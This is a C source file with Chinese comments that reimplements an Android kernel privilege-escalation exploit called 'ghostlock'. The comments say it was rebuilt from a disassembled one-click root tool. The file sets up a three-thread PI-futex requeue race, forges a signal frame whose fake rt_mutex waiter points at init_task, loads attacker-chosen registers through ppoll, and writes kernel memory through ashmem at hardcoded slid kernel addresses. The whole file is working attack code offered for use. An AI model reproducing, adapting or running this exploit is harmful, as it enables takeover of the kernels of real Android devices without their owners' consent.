/* race.c — 三线程 PI-futex 竞态 + sigframe 构造
 *
 * 逐指令对照 glpreload（一键root v1.6 assets/glpreload，sha256 4980bb4f…）：
 *   consumer_thread   0x626218
 *   waiter_thread     0x626414
 *   owner_thread      0x62669c
 *   ghostlock_main    0x6267ac
 *   sig_stack_copy    0x625edc
 *   ppoll_from_regs   0x627a98
 * 参考全局（0x636f38..0x637250）→ 本文件同名 g_* 变量。
 * 唯一结构性偏差：参考把 sigframe 地址放在栈上 [sp+0x28] 里循环取用，
 * 这里用两个文件内静态 g_sig_frame / g_sig_entry_sp 承接（语义等价，见 docs/ghostlock-chain.md）。
 */
#include "ghost.h"

#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

/* ---- 参考全局 ---- */
volatile int g_stage = 1;          /* 0x636fd8 */
uint64_t g_cfg[3];                 /* 0x636fa8 */
uint64_t g_fake_lock_addr;         /* 0x636fa0 里存的值 */
uint8_t  g_fops[0x110];            /* 0x637038 */
uint8_t  g_sig_waiter[0x58];       /* 0x636f48 */

uint32_t g_f_pi_chain;             /* 0x636fe0 */
uint32_t g_waiter_ready;           /* 0x636fe4 */
uint32_t g_owner_started;          /* 0x636fe8 */
uint32_t g_waiter_waiting;         /* 0x636fec */
uint32_t g_f_wait;                 /* 0x636ff0 */
uint32_t g_f_pi_target;            /* 0x636ff4 */
uint32_t g_route_done;             /* 0x636ff8 */
uint32_t g_consume_go;             /* 0x636fc0 */
uint32_t g_consume_enter_sched;    /* 0x636fc4 */
uint32_t g_sched_stop;             /* 0x636fc8 */
uint32_t g_consume_stop;           /* 0x636fcc */
uint32_t g_waiter_tid;             /* 0x636fd0 */
uint32_t g_consume_calls;          /* 0x636fd4 */
uint32_t g_consume_sched_ok;       /* 0x636fdc */
uint32_t g_owner_alive;            /* 0x636ffc */
uint32_t g_owner_stop;             /* 0x637000 */

pthread_t g_run_owner_thr;          /* 0x637008 */
uint32_t  g_run_owner_valid;        /* 0x637010 */
uint8_t *g_sig_frame;              /* 参考 [sp+0x28]：sigframe 基址（asm 里按符号取） */
uint8_t *g_sig_entry_sp;           /* 参考序言后的 x29（E），epilogue 用 */
static pthread_t th_waiter, th_owner, th_consumer;

#define YELLOW "\x1b[33m[*] \x1b[0m"
#define RED    "\x1b[31m[!] \x1b[0m"

/* 参考 0x6270c8：4 字节空处理函数 */
static void interrupt_handler(int sig) { (void)sig; }

/* ------------------------------------------------------------------ */
/* ppoll_from_regs 0x627a98：把 regs[0..30] 灌进寄存器，x8 硬写 73(ppoll) */
/* ------------------------------------------------------------------ */
__attribute__((naked)) long ppoll_from_regs(const uint64_t *r)
{
    __asm__ volatile(
        "sub sp, sp, #0x180\n"
        "stp x29, x30, [sp, #0x110]\n"
        "stp x27, x28, [sp, #0x130]\n"
        "stp x25, x26, [sp, #0x140]\n"
        "stp x23, x24, [sp, #0x150]\n"
        "stp x21, x22, [sp, #0x160]\n"
        "stp x19, x20, [sp, #0x170]\n"
        "mov x5, sp\n"
        "mov x2, #0\n"
        "1:\n"
        "ldr x3, [x0, x2]\n"
        "str x3, [x5, x2]\n"
        "add x2, x2, #8\n"
        "cmp x2, #0xf8\n"
        "b.ne 1b\n"
        "ldp x19, x20, [sp, #0x98]\n"
        "ldp x21, x22, [sp, #0xa8]\n"
        "ldp x23, x24, [sp, #0xb8]\n"
        "ldp x25, x26, [sp, #0xc8]\n"
        "ldp x27, x28, [sp, #0xd8]\n"
        "ldp x29, x30, [sp, #0xe8]\n"
        "ldp x9, x10, [sp, #0x48]\n"
        "ldp x11, x12, [sp, #0x58]\n"
        "ldp x13, x14, [sp, #0x68]\n"
        "ldp x15, x16, [sp, #0x78]\n"
        "ldr x17, [sp, #0x88]\n"
        "ldp x0, x1, [sp, #0x00]\n"
        "ldp x2, x3, [sp, #0x10]\n"
        "ldp x4, x5, [sp, #0x20]\n"
        "ldp x6, x7, [sp, #0x30]\n"
        "mov x8, #73\n"
        "svc #0\n"
        "ldp x19, x20, [sp, #0x170]\n"
        "ldp x21, x22, [sp, #0x160]\n"
        "ldp x23, x24, [sp, #0x150]\n"
        "ldp x25, x26, [sp, #0x140]\n"
        "ldp x27, x28, [sp, #0x130]\n"
        "ldp x29, x30, [sp, #0x110]\n"
        "add sp, sp, #0x180\n"
        "ret\n");
}

/* ------------------------------------------------------------------ */
/* sig_stack_copy 0x625edc：伪造 rt_sigframe（uc + 假 fpsimd_context）    */
/* ------------------------------------------------------------------ */
void ghost_sigframe_fill(uint8_t *E) __attribute__((noreturn, used));
void ghost_sig_after(void);
__attribute__((naked)) static void sig_resume_retry(void);

__attribute__((naked)) void sig_stack_copy(void)
{
    __asm__ volatile(
        "stp x29, x30, [sp, #-0x20]!\n"
        "stp x28, x19, [sp, #0x10]\n"
        "mov x29, sp\n"
        "mov x0, x29\n"
        "sub sp, sp, #0x20\n"
        "bl ghost_sigframe_fill\n"
        "brk #0\n");
}

void ghost_sigframe_fill(uint8_t *E)
{
    uint8_t *frame = E - 0x1280;              /* frame = 序言后 sp + 0x30 = E - 0x1280 */
    uint8_t *uc    = frame + 0x80;
    uint8_t *S     = frame + 0x250;           /* uc + 0xb0 + 0x120 */
    uint64_t nzcv;

    /* g_sig_waiter：0x58 B */
    memset(g_sig_waiter, 0, 0x58);
    *(uint64_t *)(g_sig_waiter + 0x30) = g.slide + g_map->init_task;   /* text_addr(init_task) */
    *(uint64_t *)(g_sig_waiter + 0x38) = g_fake_lock_addr;
    *(uint32_t *)(g_sig_waiter + 0x44) = 0x82;
    *(uint64_t *)(g_sig_waiter + 0x48) = 0;
    {
        uint64_t *w = (uint64_t *)g_sig_waiter;
        w[0] = g_cfg[0]; w[1] = g_cfg[2]; w[2] = g_cfg[1];
        w[3] = g_cfg[0]; w[4] = g_cfg[2]; w[5] = g_cfg[1];
    }

    memset(frame, 0, 0x1250);
    *(uint64_t *)(frame - 8) = (uint64_t)(uintptr_t)frame;
    g_sig_frame = frame;
    g_sig_entry_sp = E;

    *(uint32_t *)(S + 0) = 0x46508001;        /* FPSIMD_MAGIC */
    *(uint32_t *)(S + 4) = 0x210;             /* sizeof(fpsimd_context) */
    printf(YELLOW "before sig\n");
    memcpy(S + 0xf8, g_sig_waiter, 0x58);

    __asm__ volatile("mrs %0, nzcv" : "=r"(nzcv));
    *(uint64_t *)(uc + 0x1c0) = nzcv;                                   /* pstate */
    *(uint64_t *)(uc + 0x1b8) = (uint64_t)(uintptr_t)&sig_resume_retry;  /* pc */
    *(uint64_t *)(uc + 0x1b0) = (uint64_t)(uintptr_t)(E - 0x12b0);       /* sp */
    __atomic_store_n(&g_consume_go, 1u, __ATOMIC_SEQ_CST);

    /* 存活寄存器快照 + rt_sigreturn（参考 0x6260e0..0x626158） */
    {
        uint64_t fr = (uint64_t)(uintptr_t)frame;
        __asm__ volatile(
            "ldr x10, %0\n"
            "add x8, x10, #0x130\n"       /* sigctx = frame + 0x130 */
            "mov x9, x8\n"
            "stp x0, x1, [x8, #0x08]\n"
            "stp x2, x3, [x8, #0x18]\n"
            "stp x4, x5, [x8, #0x28]\n"
            "stp x6, x7, [x8, #0x38]\n"
            "stp x8, x9, [x8, #0x48]\n"
            "stp x10, x11, [x8, #0x58]\n"
            "stp x12, x13, [x8, #0x68]\n"
            "stp x14, x15, [x8, #0x78]\n"
            "stp x16, x17, [x8, #0x88]\n"
            "stp x18, x19, [x8, #0x98]\n"
            "stp x20, x21, [x8, #0xa8]\n"
            "stp x22, x23, [x8, #0xb8]\n"
            "stp x24, x25, [x8, #0xc8]\n"
            "stp x26, x27, [x8, #0xd8]\n"
            "stp x28, x29, [x8, #0xe8]\n"
            "str x30, [x8, #0xf8]\n"
            "mov sp, x10\n"
            "mov x8, #139\n"
            "svc #0\n"
            "mov x0, #1\n"
            "mov x8, #94\n"
            "svc #0\n"
            :: "m"(fr) : "memory");
    }
    __builtin_unreachable();
}

/* 参考 0x62615c：rt_sigreturn 回来后的续点（PC 写进 uc+0x1b8）
 * 这一段必须整段用汇编：svc 返回后 sp 已被内核恢复成 uc+0x1b0，
 * 任何 C 代码（包括编译器对 sp 的假设）都会失效。 */
void ghost_sig_after(void)
{
    __atomic_store_n(&g_sched_stop, 1u, __ATOMIC_SEQ_CST);
    while (!__atomic_load_n(&g_consume_stop, __ATOMIC_ACQUIRE))
        __asm__ volatile("yield" ::: "memory");
    __atomic_store_n(&g_consume_go, 0u, __ATOMIC_SEQ_CST);
    printf(YELLOW "after sig\n");
}

__attribute__((naked)) static void sig_resume_retry(void)
{
    __asm__ volatile(
        "1:\n"
        "adrp x9, g_consume_enter_sched\n"
        "add  x9, x9, :lo12:g_consume_enter_sched\n"
        "ldar w10, [x9]\n"
        "cbnz w10, 2f\n"
        "adrp x9, g_sig_frame\n"
        "ldr  x10, [x9, :lo12:g_sig_frame]\n"
        "mov  sp, x10\n"
        "mov  x8, #139\n"
        "svc  #0\n"
        "b 1b\n"
        "2:\n"
        "bl ghost_sig_after\n"
        "adrp x9, g_sig_entry_sp\n"
        "ldr  x10, [x9, :lo12:g_sig_entry_sp]\n"
        "mov  sp, x10\n"
        "ldp x28, x19, [sp, #0x10]\n"
        "ldp x29, x30, [sp], #0x20\n"
        "ret\n");
}

/* ------------------------------------------------------------------ */
/* consumer_thread 0x626218                                            */
/* ------------------------------------------------------------------ */
static void *consumer_thread(void *arg)
{
    (void)arg;
    disable_rseq_for_thread();
    cpubind_bind(1);
    int tid = (int)syscall(__NR_gettid);
    if (sched_setattr_tid(tid, -20) != 0) {
        printf(RED "SYSCHK(sched_setattr_tid(syscall(SYS_gettid), -20)): %s\n", strerror(errno));
        _exit(-1);
    }

    int last = 0;
    for (;;) {
        int go = (int)__atomic_load_n(&g_consume_go, __ATOMIC_ACQUIRE);
        if (go == 0) {
            sched_yield();
            if (__atomic_load_n(&g_consume_stop, __ATOMIC_ACQUIRE)) return NULL;
            continue;
        }
        if (go == last) { sched_yield(); continue; }
        sleep(1);
        int go2 = (int)__atomic_load_n(&g_consume_go, __ATOMIC_ACQUIRE);
        if (go2 != go) { last = go; continue; }
        last = go;
        if (go2 == 1) usleep(50000);
        break;
    }

    int wtid = (int)__atomic_load_n(&g_waiter_tid, __ATOMIC_ACQUIRE);
    printf(YELLOW "before sched\n");
    __atomic_fetch_add(&g_consume_calls, 1u, __ATOMIC_SEQ_CST);
    __atomic_fetch_add(&g_consume_enter_sched, 1u, __ATOMIC_SEQ_CST);
    while (!__atomic_load_n(&g_sched_stop, __ATOMIC_ACQUIRE))
        __asm__ volatile("yield" ::: "memory");
    errno = 0;
    int rc = sched_setattr_tid(wtid, -19);
    printf(YELLOW "after sched\n");

    if (__atomic_load_n(&g_stage, __ATOMIC_ACQUIRE) == 2) {
        printf(YELLOW "openning fd\n");
        int fd = open_ashmem_device();
        g.fd_ashmem = fd;
        uint64_t val = g.slide + 0xffffffc009274ad8ULL;       /* K2 */
        if (kernel_write_data(fd, g.slide + 0xffffffc0a53c2c0ULL, &val, 8) != 8)  /* K1 */
            printf(RED "ashmem restore: %s\n", strerror(errno));
    }

    if (rc == 0) __atomic_fetch_add(&g_consume_sched_ok, 1u, __ATOMIC_SEQ_CST);
    __atomic_store_n(&g_consume_stop, 1u, __ATOMIC_SEQ_CST);
    while (__atomic_load_n(&g_consume_go, __ATOMIC_ACQUIRE) != 0)
        __asm__ volatile("yield" ::: "memory");
    return NULL;
}

/* ------------------------------------------------------------------ */
/* waiter_thread 0x626414                                              */
/* ------------------------------------------------------------------ */
static void *waiter_thread(void *arg)
{
    (void)arg;
    struct timespec ts;
    uint64_t regs[34];
    int tid;

    disable_rseq_for_thread();
    cpubind_bind(0);
    tid = (int)syscall(__NR_gettid);
    if (sched_setattr_tid(tid, -20) != 0) {
        printf(RED "SYSCHK(sched_setattr_tid(tid, -20)): %s\n", strerror(errno));
        _exit(-1);
    }
    __atomic_store_n(&g_waiter_tid, (uint32_t)tid, __ATOMIC_SEQ_CST);

    if (futex_op(&g_f_pi_chain, 6 /* FUTEX_LOCK_PI */, 0, NULL, NULL, 0) != 0)
        return NULL;
    __atomic_store_n(&g_waiter_ready, 1u, __ATOMIC_SEQ_CST);
    while (!__atomic_load_n(&g_owner_started, __ATOMIC_ACQUIRE)) usleep(1000);

    printf(YELLOW "before futex\n");
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 5;
    __atomic_store_n(&g_waiter_waiting, 1u, __ATOMIC_SEQ_CST);
    futex_op(&g_f_wait, 11 /* FUTEX_WAIT_BITSET */, 0, &ts, &g_f_pi_target, 0);
    futex_op(&g_f_pi_chain, 7 /* FUTEX_UNLOCK_PI */, 0, NULL, NULL, 0);
    printf(YELLOW "after futex\n");

    sig_stack_copy();
    printf(YELLOW "before clean\n");
    {
        struct timespec to = { .tv_sec = 0, .tv_nsec = 100000 };
        errno = 0;
        long r = futex_op((uint32_t *)0x633e6cUL, 0 /* FUTEX_WAIT */, 1, &to, NULL, 0);
        fprintf(stderr, "[dbg] %s: ret=%ld errno=%d (%s) %s\n",
                "cmped", r, errno, strerror(errno),
                errno == 110 ? "expected" : "unexpected");
    }
    __atomic_store_n(&g_route_done, 1u, __ATOMIC_SEQ_CST);

    if (__atomic_load_n(&g_stage, __ATOMIC_ACQUIRE) != 1) return NULL;

    for (;;) {
        signal(SIGUSR1, interrupt_handler);
        memset(regs, 0, sizeof(regs));
        memcpy(regs, g_fops, 0x110);
        memset(regs, 0, 0x20);
        ppoll_from_regs(regs);
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* owner_thread 0x62669c                                               */
/* ------------------------------------------------------------------ */
static void *owner_thread(void *arg)
{
    (void)arg;
    int tid;
    __atomic_store_n(&g_owner_alive, 1u, __ATOMIC_SEQ_CST);
    tid = (int)syscall(__NR_gettid);
    sched_setattr_tid(tid, 19);
    if (futex_op(&g_f_pi_target, 6 /* FUTEX_LOCK_PI */, 0, NULL, NULL, 0) != 0)
        goto out;
    while (!__atomic_load_n(&g_waiter_ready, __ATOMIC_ACQUIRE)) usleep(1000);
    __atomic_store_n(&g_owner_started, 1u, __ATOMIC_SEQ_CST);
    futex_op(&g_f_pi_chain, 6, 0, NULL, NULL, 0);
    while (!__atomic_load_n(&g_owner_stop, __ATOMIC_ACQUIRE)) pause();
    futex_op(&g_f_pi_chain, 7, 0, NULL, NULL, 0);
    futex_op(&g_f_pi_target, 7, 0, NULL, NULL, 0);
out:
    __atomic_store_n(&g_owner_alive, 0u, __ATOMIC_SEQ_CST);
    return NULL;
}

/* ------------------------------------------------------------------ */
/* ghostlock_main 0x6267ac                                             */
/* ------------------------------------------------------------------ */
int ghostlock_main(void)
{
    pthread_attr_t at;
    int i;

    if (cpubind_init() != 0) return 0;
    cpubind_bind(2);
    pthread_attr_init(&at);
    pthread_attr_setdetachstate(&at, PTHREAD_CREATE_DETACHED);

    if (pthread_create(&th_waiter, &at, waiter_thread, NULL) != 0) return 0;
    if (pthread_create(&th_owner, &at, owner_thread, NULL) != 0) return 0;
    g_run_owner_thr = th_owner;
    __atomic_store_n(&g_run_owner_valid, 1u, __ATOMIC_SEQ_CST);
    if (pthread_create(&th_consumer, &at, consumer_thread, NULL) != 0) return 0;
    pthread_attr_destroy(&at);

    while (!__atomic_load_n(&g_waiter_waiting, __ATOMIC_ACQUIRE) ||
           !__atomic_load_n(&g_owner_started, __ATOMIC_ACQUIRE))
        usleep(1000);

    errno = 0;
    {
        long r = futex_op(&g_f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1, (void *)1,
                          &g_f_pi_target, 0);
        fprintf(stderr, "[dbg] %s: ret=%ld errno=%d (%s) %s\n",
                "cmped", r, errno, strerror(errno),
                errno == 0x23 ? "expected" : "unexpected");
    }

    for (i = 0; i < 60; i++) {
        if (__atomic_load_n(&g_route_done, __ATOMIC_ACQUIRE)) break;
        sleep(1);
    }
    if (!__atomic_load_n(&g_route_done, __ATOMIC_ACQUIRE)) {
        printf("\x1b[31m[-] \x1b[0mroute timeout\n");
        return 0;
    }

    cpubind_shutdown();
    if (__atomic_load_n(&g_stage, __ATOMIC_ACQUIRE) == 2) return 1;
    return -1;
}

void ghost_stop(void)
{
    __atomic_store_n(&g_owner_stop, 1u, __ATOMIC_SEQ_CST);
    __atomic_store_n(&g_consume_stop, 1u, __ATOMIC_SEQ_CST);
    usleep(2000);
    cpubind_shutdown();
}